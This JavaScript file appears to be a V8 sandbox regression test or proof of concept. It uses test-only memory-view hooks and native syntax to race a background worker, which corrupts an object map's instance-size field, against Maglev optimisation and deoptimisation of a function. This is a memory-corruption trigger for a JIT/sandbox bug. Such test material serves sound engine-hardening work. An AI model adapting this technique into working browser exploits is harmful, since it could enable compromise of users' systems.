let sbx_mem = new DataView(new Sandbox.MemoryView(0, 0x500000000));

function corruptInBackground(address) {
    function workerTemplate(address) {
        let sbx_mem = new DataView(new Sandbox.MemoryView(0, 0x500000000));
        let orig = sbx_mem.getUint8(address);
        var c = true;

        while(true) {
            if (c) {
                sbx_mem.setUint8(address, orig);
            } else {
                sbx_mem.setUint8(address, 0xff);
            }
            c = !c;
        }
    }

    const workerCode = new Function(
        `(${workerTemplate})(${address})`);
    return new Worker(workerCode, { type: 'function' });
}

let arr_addr = 0;

function f0() {
    let arr = [512,9];
    arr_addr = Sandbox.getAddressOf(arr);
    return arr instanceof f0;
}
f0();

let map_addr = sbx_mem.getUint32(arr_addr, true) - 1;
let instance_size_in_words_addr = map_addr + 4;

for (let round = 0; round < 512; round++) {
    let worker = corruptInBackground(instance_size_in_words_addr);
    for(let i = 0; i < 128; i++) {
        %OptimizeMaglevOnNextCall(f0);
        f0();
        %DeoptimizeFunction(f0);
    }
    worker.terminate()
    gc();
}
